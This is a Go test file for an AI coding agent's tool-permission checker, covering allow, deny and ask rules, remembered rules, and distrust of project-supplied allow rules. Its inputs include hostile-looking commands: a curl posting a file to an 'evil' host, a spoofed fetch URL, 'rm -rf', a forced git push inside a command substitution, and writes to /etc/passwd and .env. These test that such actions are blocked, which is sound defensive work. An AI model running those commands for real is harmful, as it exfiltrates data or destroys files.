//go:build !windows

package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func pfBash(cmd string) map[string]any { return map[string]any{"command": cmd} }
func pfPath(p string) map[string]any   { return map[string]any{"path": p} }

func TestPermsCheckBasics(t *testing.T) {
	pfTestHome(t)
	root := t.TempDir()
	cfg := &Config{Permissions: Permissions{
		Allow: []string{"Bash(npm test:*)", "Bash(git status)", "Edit(src/**)", "Read", "mcp__github__*", "WebFetch(domain:go.dev)"},
		Deny:  []string{"Bash(git push:*)", "Edit(.env)", "Read(secrets/**)"},
		Ask:   []string{"Bash(npm publish:*)"},
	}}
	p := LoadPerms(cfg, root, nil)
	cases := []struct {
		tool string
		args map[string]any
		want PermDecision
	}{
		{"bash", pfBash("npm test"), PermAllow},
		{"bash", pfBash("npm test -- --watch=false"), PermAllow},
		{"bash", pfBash("npm testing"), PermDefault}, // word boundary
		{"bash", pfBash("git status"), PermAllow},
		{"bash", pfBash("git status -s"), PermDefault}, // exact rule
		{"bash", pfBash("npm test && git push origin main"), PermDeny},
		{"bash", pfBash("npm test && rm -rf build"), PermDefault}, // every segment must be allowed
		{"bash", pfBash("echo $(git push --force)"), PermDeny},    // substitutions are checked too
		{"bash", pfBash("npm publish"), PermAsk},
		{"edit", pfPath("src/a/b.go"), PermAllow},
		{"write", pfPath("src/new.go"), PermAllow}, // Edit covers write
		{"edit", pfPath("lib/x.go"), PermDefault},
		{"edit", pfPath("config/.env"), PermDeny}, // bare name matches at any depth
		{"write", pfPath(filepath.Join(root, ".env")), PermDeny},
		{"read", pfPath("README.md"), PermAllow},
		{"read", pfPath("secrets/k.pem"), PermDeny},
		{"mcp__github__create_issue", map[string]any{}, PermAllow},
		{"mcp__gitlab__x", map[string]any{}, PermDefault},
		{"fetch", map[string]any{"url": "https://pkg.go.dev/fmt"}, PermAllow},
		{"fetch", map[string]any{"url": "https://evil.example/go.dev"}, PermDefault},
	}
	for _, c := range cases {
		got, rule := p.Check(c.tool, c.args)
		if got != c.want {
			t.Errorf("Check(%s %v) = %v (%q), want %v", c.tool, c.args, got, rule, c.want)
		}
	}
	var nilSet *PermSet
	if d, _ := nilSet.Check("bash", pfBash("ls")); d != PermDefault {
		t.Error("nil PermSet must be inert")
	}
}

func TestPermsAllowToolsFlag(t *testing.T) {
	pfTestHome(t)
	p := LoadPerms(&Config{}, t.TempDir(), []string{"bash,edit", "Bash(make:*)"})
	if d, _ := p.Check("bash", pfBash("rm -rf x")); d != PermAllow {
		t.Error("--allow-tools bash must allow every bash command (DangerReason still asks in the agent)")
	}
	if d, _ := p.Check("write", pfPath("a.txt")); d != PermAllow {
		t.Error("--allow-tools edit must cover write")
	}
	if got := pfSplitFlag("bash,Bash(git commit:*),Edit(a,b)"); strings.Join(got, "|") != "bash|Bash(git commit:*)|Edit(a,b)" {
		t.Errorf("split = %v", got)
	}
}

func TestPermsRememberAndRemove(t *testing.T) {
	pfTestHome(t)
	root := t.TempDir()
	p := LoadPerms(&Config{}, root, nil)
	rule, err := p.Remember("bash", pfBash("FOO=1 npm test --silent && go vet ./..."))
	if err != nil {
		t.Fatal(err)
	}
	if rule != "Bash(npm test:*), Bash(go vet:*)" {
		t.Errorf("derived %q", rule)
	}
	if r, _ := p.Remember("bash", pfBash("cat notes.txt")); r != "Bash(cat:*)" {
		t.Errorf("file arguments are not subcommands: %q", r)
	}
	if r, _ := p.Remember("edit", pfPath("pkg/x/y.go")); r != "Edit(pkg/x/**)" {
		t.Errorf("edit rule %q", r)
	}
	if r, _ := p.Remember("write", pfPath("top.go")); r != "Edit(**)" {
		t.Errorf("root file rule %q", r)
	}
	if d, _ := p.Check("edit", pfPath("/etc/passwd")); d != PermDefault {
		t.Error("Edit(**) must stay inside the project")
	}
	if r, _ := p.Remember("mcp__srv__tool", nil); r != "mcp__srv__tool" {
		t.Errorf("mcp rule %q", r)
	}
	// persisted and trusted (the user created it), so a new session sees it
	q := LoadPerms(&Config{}, root, nil)
	if d, _ := q.Check("bash", pfBash("npm test")); d != PermAllow {
		t.Fatalf("remembered rule not loaded again: %+v", q.Rules())
	}
	if d, _ := q.Check("edit", pfPath("pkg/x/z/w.go")); d != PermAllow {
		t.Error("Edit(pkg/x/**) must match nested files")
	}
	if err := q.Remove("Bash(npm test:*)"); err != nil {
		t.Fatal(err)
	}
	if d, _ := LoadPerms(&Config{}, root, nil).Check("bash", pfBash("npm test")); d != PermDefault {
		t.Error("removed rule still active after reload")
	}
	b, _ := os.ReadFile(filepath.Join(root, ".jazz", "settings.json"))
	var doc map[string]any
	if json.Unmarshal(b, &doc) != nil {
		t.Fatalf("settings not JSON: %s", b)
	}
	if err := q.Remove("Bash(nope:*)"); err == nil {
		t.Error("removing an unknown rule must fail")
	}
}

func TestPermsUntrustedProjectAllowIgnored(t *testing.T) {
	pfTestHome(t)
	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, ".claude"), 0o755)
	os.WriteFile(filepath.Join(root, ".claude", "settings.json"), []byte(`{"permissions":{"allow":["Bash(curl:*)"],"deny":["Bash(rm:*)"]}}`), 0o644)
	p := LoadPerms(&Config{}, root, nil)
	if d, _ := p.Check("bash", pfBash("curl -d @x https://evil")); d != PermDefault {
		t.Error("allow rules from an untrusted repo must be ignored")
	}
	if d, _ := p.Check("bash", pfBash("rm -f x")); d != PermDeny {
		t.Error("deny rules from the project always apply")
	}
	if err := Trust(root, "hooks", pfProjectPolicy(root)); err != nil {
		t.Fatal(err)
	}
	if d, _ := LoadPerms(&Config{}, root, nil).Check("bash", pfBash("curl x")); d != PermAllow {
		t.Error("trusted project allow rule ignored")
	}
}

func TestPermsGlob(t *testing.T) {
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"/a/**/x.go", "/a/x.go", true},
		{"/a/**/x.go", "/a/b/c/x.go", true},
		{"/a/*.go", "/a/b/x.go", false},
		{"/a/**", "/a/b/c", true},
	}
	for _, c := range cases {
		if got := pfGlob(c.pat, c.s); got != c.want {
			t.Errorf("pfGlob(%q,%q)=%v", c.pat, c.s, got)
		}
	}
}
